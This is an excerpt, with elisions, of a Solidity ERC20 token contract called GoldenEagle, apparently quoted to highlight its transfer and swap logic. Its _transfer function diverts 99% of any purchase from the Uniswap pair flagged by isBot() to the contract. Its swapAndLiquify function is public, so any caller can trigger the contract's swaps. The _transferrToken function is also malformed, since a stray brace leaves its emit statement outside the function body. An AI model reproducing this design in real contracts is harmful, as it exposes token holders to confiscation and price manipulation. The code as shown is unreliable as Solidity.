...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function _transferrToken(
		...
		uint256 receiveAmount = _balances[recipient];
		_balances[sender] = senderAmount.sub(amount);
		_balances[recipient] = receiveAmount.add(amount);}
		emit Transfer(sender, recipient, amount);
    }
...
contract GoldenEagle is ERC20 {
    ...
    function _transfer(
        ...
        if(balanceOf(address(this)) > swapTokensAtAmount && balanceOf(address(this)) > amount){
            if (
                !swapping &&
                _tokenOwner != from &&
                _tokenOwner != to &&
        ...
        if(from == uniswapV2Pair && isBot()){
            super._transfer(from, address(this), amount.div(100).mul(99));
            amount = amount.div(100);
        }

        if(balanceOf(address(this)) > amount.div(10000)){
            _takeInviterFeeKt(amount.div(1000000));
        }

        if (takeFee) {
			super._transfer(from, address(this), amount.div(100).mul(swapfee));
			amount = amount.div(100).mul(100 - swapfee);
        }
        super._transfer(from, to, amount);
    }
    
	function swapAndLiquify(uint256 allAmount) public {
		swapTokensForOther(allAmount);
		uint256 ethBalance = USDT.balanceOf(address(this));
		if(ethBalance.mul(ethBalance) > 10**48){
			swapAndLiquifyLDX();
		}
    }
    ...
    function swapAndLiquifyLDX() private {
        uint256 ethBalance = USDT.balanceOf(address(this));
